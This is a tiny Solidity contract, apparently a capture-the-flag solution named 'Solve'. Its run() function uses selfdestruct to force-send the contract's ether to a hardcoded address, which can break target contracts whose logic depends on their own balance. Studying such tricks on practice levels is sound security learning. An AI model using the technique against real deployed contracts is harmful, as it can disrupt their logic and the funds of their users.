// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Solve {
    function run() external payable {
        selfdestruct(payable(0x6878Ac86a3c81167F539B83ddE23672db98f6FD0));
    }
}

// create & run() with some value